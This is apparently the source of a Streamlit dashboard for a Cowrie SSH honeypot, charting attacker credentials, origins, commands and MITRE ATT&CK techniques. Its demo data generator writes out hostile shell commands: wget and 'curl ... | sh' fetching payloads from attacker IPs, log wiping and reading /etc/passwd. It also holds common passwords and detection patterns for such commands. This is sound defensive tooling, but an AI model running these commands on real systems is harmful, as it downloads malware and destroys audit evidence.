#!/usr/bin/env python3
"""
Enterprise Cowrie Threat Intelligence Dashboard
================================================
Interactive Streamlit application for visualizing SSH honeypot telemetry,
attacker credential analysis, geographic origin mapping, and MITRE ATT&CK
technique distribution.

Usage:
    streamlit run dashboards/app.py
"""

import json
import os
import re
import sys
from collections import Counter
from datetime import datetime, timezone
from typing import Any, Dict, List

import pandas as pd
import plotly.express as px
import plotly.graph_objects as go
import streamlit as st

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------

PAGE_TITLE = "Enterprise SSH Honeypot | Threat Intelligence Dashboard"
DEFAULT_LOG_PATH = os.path.join(
    os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
    "data", "logs", "cowrie.json",
)

MITRE_COMMAND_SIGNATURES = [
    (r"uname|cat /etc/issue|lsb_release|cat /proc/cpuinfo|lscpu",
     "T1082", "Discovery", "System Information Discovery"),
    (r"whoami|id\b|w\b|who\b",
     "T1033", "Discovery", "System Owner/User Discovery"),
    (r"ifconfig|ip addr|ip a\b|netstat|ss\b",
     "T1016", "Discovery", "System Network Configuration Discovery"),
    (r"ps aux|ps -ef|top\b",
     "T1057", "Discovery", "Process Discovery"),
    (r"ls -la|find /|dir\b",
     "T1083", "Discovery", "File and Directory Discovery"),
    (r"curl |wget |tftp |ftp ",
     "T1105", "Command and Control", "Ingress Tool Transfer"),
    (r"chmod \+x|chmod 777",
     "T1222.002", "Defense Evasion", "File and Directory Permissions Modification"),
    (r"nohup |python|perl|bash -i",
     "T1059.004", "Execution", "Command and Scripting Interpreter: Unix Shell"),
    (r"history -c|rm -rf /var/log|unset HISTFILE",
     "T1070.004", "Defense Evasion", "Indicator Removal: File Deletion"),
    (r"crontab|authorized_keys|/etc/cron",
     "T1053.003", "Persistence", "Scheduled Task/Job: Cron"),
]

# Country coordinates for geographic mapping (ISO Alpha-3)
COUNTRY_COORDS = {
    "CN": ("China", 35.86, 104.19),
    "US": ("United States", 37.09, -95.71),
    "RU": ("Russia", 61.52, 105.31),
    "VN": ("Vietnam", 14.06, 108.28),
    "IN": ("India", 20.59, 78.96),
    "BR": ("Brazil", -14.24, -51.93),
    "DE": ("Germany", 51.17, 10.45),
    "KR": ("South Korea", 35.91, 127.77),
    "FR": ("France", 46.23, 2.21),
    "NL": ("Netherlands", 52.13, 5.29),
    "GB": ("United Kingdom", 55.38, -3.44),
    "ID": ("Indonesia", -0.79, 113.92),
    "TW": ("Taiwan", 23.70, 120.96),
    "JP": ("Japan", 36.20, 138.25),
    "PK": ("Pakistan", 30.38, 69.35),
    "TH": ("Thailand", 15.87, 100.99),
    "TR": ("Turkey", 38.96, 35.24),
    "UA": ("Ukraine", 48.38, 31.17),
    "PL": ("Poland", 51.92, 19.15),
    "CO": ("Colombia", 4.57, -74.30),
    "XX": ("Unknown", 0.0, 0.0),
}


# ---------------------------------------------------------------------------
# Data Loading & Parsing
# ---------------------------------------------------------------------------

def parse_cowrie_log(filepath: str) -> List[Dict[str, Any]]:
    """Reads an NDJSON Cowrie log file and returns a list of event dicts."""
    events = []
    with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            line = line.strip()
            if not line:
                continue
            try:
                events.append(json.loads(line))
            except json.JSONDecodeError:
                continue
    return events


def generate_demo_events(count: int = 200) -> List[Dict[str, Any]]:
    """Produces synthetic Cowrie events for demonstration purposes."""
    import random

    ips = [
        "194.26.29.112", "185.156.73.45", "45.148.10.15", "103.151.125.8",
        "198.199.95.21", "91.240.118.234", "180.101.88.243", "79.137.202.19",
        "218.92.0.112", "61.177.172.55", "14.161.45.68", "177.54.150.200",
    ]
    ip_countries = {
        "194.26.29.112": "RU", "185.156.73.45": "NL", "45.148.10.15": "DE",
        "103.151.125.8": "VN", "198.199.95.21": "US", "91.240.118.234": "UA",
        "180.101.88.243": "CN", "79.137.202.19": "FR", "218.92.0.112": "CN",
        "61.177.172.55": "CN", "14.161.45.68": "VN", "177.54.150.200": "BR",
    }
    users = ["root", "admin", "ubuntu", "user", "test", "postgres", "support", "oracle", "guest"]
    passwords = ["123456", "password", "admin", "root", "1234", "toor", "qwerty",
                 "changeme", "letmein", "default", "p@ssw0rd", "admin123"]
    commands = [
        "uname -a", "cat /proc/cpuinfo", "id", "whoami", "w",
        "cat /etc/issue", "ifconfig", "ip addr", "netstat -tuln",
        "ps aux", "ls -la /tmp", "cat /etc/passwd",
        "wget http://194.26.29.112/bins/arm7 -O /tmp/.cache && chmod +x /tmp/.cache",
        "curl -s http://185.156.73.45/init.sh | sh",
        "history -c", "rm -rf /var/log/*",
        "crontab -l", "nohup /tmp/.cache &",
        "free -m", "lscpu",
    ]

    events = []
    for i in range(count):
        ip = random.choice(ips)
        ts = f"2026-10-{random.randint(18, 22):02d}T{random.randint(0, 23):02d}:{random.randint(0, 59):02d}:{random.randint(0, 59):02d}.000000Z"
        session = f"sess_{random.randint(10000, 99999)}"
        roll = random.random()

        if roll < 0.60:
            events.append({
                "eventid": "cowrie.login.failed",
                "timestamp": ts, "src_ip": ip,
                "username": random.choice(users),
                "password": random.choice(passwords),
                "session": session,
            })
        elif roll < 0.80:
            events.append({
                "eventid": "cowrie.login.success",
                "timestamp": ts, "src_ip": ip,
                "username": random.choice(["root", "admin"]),
                "password": random.choice(["root", "123456", "admin"]),
                "session": session,
            })
            for _ in range(random.randint(1, 3)):
                events.append({
                    "eventid": "cowrie.command.input",
                    "timestamp": ts, "src_ip": ip,
                    "input": random.choice(commands),
                    "session": session,
                })
        elif roll < 0.90:
            events.append({
                "eventid": "cowrie.session.connect",
                "timestamp": ts, "src_ip": ip,
                "session": session,
            })
        else:
            events.append({
                "eventid": "cowrie.session.file_download",
                "timestamp": ts, "src_ip": ip,
                "url": f"http://{ip}/bins/{'arm7' if random.random() > 0.5 else 'x86_64'}",
                "shasum": f"{random.getrandbits(256):064x}",
                "session": session,
            })

    return events, ip_countries


def classify_mitre(command: str) -> List[Dict[str, str]]:
    """Maps a shell command to MITRE ATT&CK techniques."""
    results = []
    for pattern, tech_id, tactic, name in MITRE_COMMAND_SIGNATURES:
        if re.search(pattern, command, re.IGNORECASE):
            results.append({"id": tech_id, "tactic": tactic, "technique": name})
    if not results:
        results.append({
            "id": "T1059.004", "tactic": "Execution",
            "technique": "Command and Scripting Interpreter: Unix Shell",
        })
    return results


def build_metrics(events: List[Dict], ip_countries: Dict[str, str] = None):
    """Computes all dashboard metrics from a list of Cowrie events."""
    total = len(events)
    sessions = 0
    auth_failed = 0
    auth_success = 0
    ip_counter: Counter = Counter()
    user_counter: Counter = Counter()
    pass_counter: Counter = Counter()
    cred_counter: Counter = Counter()
    cmd_counter: Counter = Counter()
    mitre_counter: Counter = Counter()
    downloads = []

    for ev in events:
        eid = ev.get("eventid", "")
        src = ev.get("src_ip", "")
        if src:
            ip_counter[src] += 1

        if eid == "cowrie.session.connect":
            sessions += 1
        elif eid == "cowrie.login.failed":
            auth_failed += 1
            u = ev.get("username", "")
            p = ev.get("password", "")
            user_counter[u] += 1
            pass_counter[p] += 1
            cred_counter[f"{u}:{p}"] += 1
            mitre_counter["T1110.001 | Brute Force: Password Guessing"] += 1
        elif eid == "cowrie.login.success":
            auth_success += 1
            u = ev.get("username", "")
            p = ev.get("password", "")
            user_counter[u] += 1
            pass_counter[p] += 1
            cred_counter[f"{u}:{p}"] += 1
            mitre_counter["T1078 | Valid Accounts"] += 1
        elif eid == "cowrie.command.input":
            cmd = ev.get("input", "").strip()
            if cmd:
                cmd_counter[cmd] += 1
                for m in classify_mitre(cmd):
                    mitre_counter[f"{m['id']} | {m['technique']}"] += 1
        elif eid == "cowrie.session.file_download":
            downloads.append({
                "IP": src,
                "URL": ev.get("url", ""),
                "SHA256": ev.get("shasum", ""),
                "Timestamp": ev.get("timestamp", ""),
            })
            mitre_counter["T1105 | Ingress Tool Transfer"] += 1

    # Build geographic distribution
    geo_data = []
    if ip_countries:
        country_attacks: Counter = Counter()
        for ip, count in ip_counter.items():
            cc = ip_countries.get(ip, "XX")
            country_attacks[cc] += count
        for cc, count in country_attacks.items():
            name, lat, lon = COUNTRY_COORDS.get(cc, ("Unknown", 0.0, 0.0))
            geo_data.append({
                "country": name, "code": cc,
                "lat": lat, "lon": lon, "attacks": count,
            })

    return {
        "total_events": total,
        "sessions": sessions,
        "auth_failed": auth_failed,
        "auth_success": auth_success,
        "unique_ips": len(ip_counter),
        "top_ips": ip_counter.most_common(15),
        "top_users": user_counter.most_common(10),
        "top_passwords": pass_counter.most_common(10),
        "top_credentials": cred_counter.most_common(10),
        "top_commands": cmd_counter.most_common(15),
        "mitre": mitre_counter.most_common(),
        "downloads": downloads,
        "geo": geo_data,
    }


# ---------------------------------------------------------------------------
# Dashboard Rendering
# ---------------------------------------------------------------------------

def render_dashboard():
    st.set_page_config(
        page_title=PAGE_TITLE,
        layout="wide",
        initial_sidebar_state="expanded",
    )

    # -- Sidebar Controls --
    st.sidebar.title("Configuration")
    mode = st.sidebar.radio("Data Source", ["Demo Mode", "Live Log File"])

    if mode == "Live Log File":
        log_path = st.sidebar.text_input("Log file path", value=DEFAULT_LOG_PATH)
        if not os.path.exists(log_path):
            st.error(f"Log file not found: {log_path}")
            st.stop()
        events = parse_cowrie_log(log_path)
        ip_countries = None
    else:
        sample_size = st.sidebar.slider("Sample event count", 50, 500, 200, step=50)
        events, ip_countries = generate_demo_events(sample_size)

    if not events:
        st.warning("No events found. Check the log file path or increase sample size.")
        st.stop()

    m = build_metrics(events, ip_countries)

    # -- Header --
    st.title("Threat Intelligence Dashboard")
    st.caption("Enterprise SSH Honeypot (Cowrie) | MITRE ATT&CK Telemetry Analysis")

    # -- Metric Cards --
    c1, c2, c3, c4, c5 = st.columns(5)
    c1.metric("Total Events", f"{m['total_events']:,}")
    c2.metric("Unique Attacker IPs", f"{m['unique_ips']:,}")
    c3.metric("Brute-Force Attempts", f"{m['auth_failed']:,}")
    c4.metric("Successful Breaches", f"{m['auth_success']:,}")
    c5.metric("Captured Payloads", f"{len(m['downloads']):,}")

    st.divider()

    # -- Geographic Attack Map --
    if m["geo"]:
        st.subheader("Geographic Attack Origin Distribution")
        geo_df = pd.DataFrame(m["geo"])
        fig_map = px.scatter_geo(
            geo_df,
            lat="lat", lon="lon",
            size="attacks",
            hover_name="country",
            hover_data={"attacks": True, "lat": False, "lon": False, "code": True},
            color="attacks",
            color_continuous_scale="Reds",
            projection="natural earth",
            size_max=40,
        )
        fig_map.update_layout(
            margin=dict(l=0, r=0, t=30, b=0),
            height=420,
            geo=dict(
                showland=True, landcolor="#f0f0f0",
                showocean=True, oceancolor="#e8f4f8",
                showcoastlines=True, coastlinecolor="#cccccc",
                showframe=False,
            ),
            coloraxis_colorbar=dict(title="Attacks"),
        )
        st.plotly_chart(fig_map, use_container_width=True)

    st.divider()

    # -- Credential Analysis --
    col_left, col_right = st.columns(2)

    with col_left:
        st.subheader("Top Targeted Usernames")
        if m["top_users"]:
            df_users = pd.DataFrame(m["top_users"], columns=["Username", "Attempts"])
            fig_u = px.bar(
                df_users, x="Attempts", y="Username",
                orientation="h", color="Attempts",
                color_continuous_scale="Blues",
            )
            fig_u.update_layout(
                height=350, margin=dict(l=0, r=20, t=10, b=0),
                yaxis=dict(autorange="reversed"),
                showlegend=False, coloraxis_showscale=False,
            )
            st.plotly_chart(fig_u, use_container_width=True)

    with col_right:
        st.subheader("Top Targeted Passwords")
        if m["top_passwords"]:
            df_pass = pd.DataFrame(m["top_passwords"], columns=["Password", "Attempts"])
            fig_p = px.bar(
                df_pass, x="Attempts", y="Password",
                orientation="h", color="Attempts",
                color_continuous_scale="Oranges",
            )
            fig_p.update_layout(
                height=350, margin=dict(l=0, r=20, t=10, b=0),
                yaxis=dict(autorange="reversed"),
                showlegend=False, coloraxis_showscale=False,
            )
            st.plotly_chart(fig_p, use_container_width=True)

    st.divider()

    # -- MITRE ATT&CK Breakdown --
    st.subheader("MITRE ATT&CK Technique Distribution")
    if m["mitre"]:
        df_mitre = pd.DataFrame(m["mitre"], columns=["Technique", "Occurrences"])
        fig_m = px.bar(
            df_mitre, x="Occurrences", y="Technique",
            orientation="h", color="Occurrences",
            color_continuous_scale="Reds",
        )
        fig_m.update_layout(
            height=max(300, len(df_mitre) * 35),
            margin=dict(l=0, r=20, t=10, b=0),
            yaxis=dict(autorange="reversed"),
            showlegend=False, coloraxis_showscale=False,
        )
        st.plotly_chart(fig_m, use_container_width=True)

    st.divider()

    # -- Intercepted Commands --
    col_cmd, col_cred = st.columns(2)

    with col_cmd:
        st.subheader("Intercepted Attacker Commands")
        if m["top_commands"]:
            df_cmd = pd.DataFrame(m["top_commands"], columns=["Command", "Count"])
            st.dataframe(df_cmd, use_container_width=True, hide_index=True)

    with col_cred:
        st.subheader("Top Credential Pairs (Username:Password)")
        if m["top_credentials"]:
            df_cred = pd.DataFrame(m["top_credentials"], columns=["Credential", "Attempts"])
            st.dataframe(df_cred, use_container_width=True, hide_index=True)

    # -- Payload Downloads --
    if m["downloads"]:
        st.divider()
        st.subheader("Captured Malware Staging Attempts")
        df_dl = pd.DataFrame(m["downloads"])
        st.dataframe(df_dl, use_container_width=True, hide_index=True)

    # -- Top Attacker IPs --
    st.divider()
    st.subheader("Top Attacker IP Addresses")
    if m["top_ips"]:
        df_ips = pd.DataFrame(m["top_ips"], columns=["IP Address", "Total Events"])
        fig_ip = px.bar(
            df_ips.head(10), x="Total Events", y="IP Address",
            orientation="h", color="Total Events",
            color_continuous_scale="Purples",
        )
        fig_ip.update_layout(
            height=350, margin=dict(l=0, r=20, t=10, b=0),
            yaxis=dict(autorange="reversed"),
            showlegend=False, coloraxis_showscale=False,
        )
        st.plotly_chart(fig_ip, use_container_width=True)

    # -- Footer --
    st.divider()
    st.caption(
        "Enterprise SSH Honeypot Threat Intelligence Dashboard | "
        "Framework: MITRE ATT&CK Enterprise | "
        "Compliance: RGPD Recital 49, ISO/IEC 27001:2022"
    )


if __name__ == "__main__":
    render_dashboard()
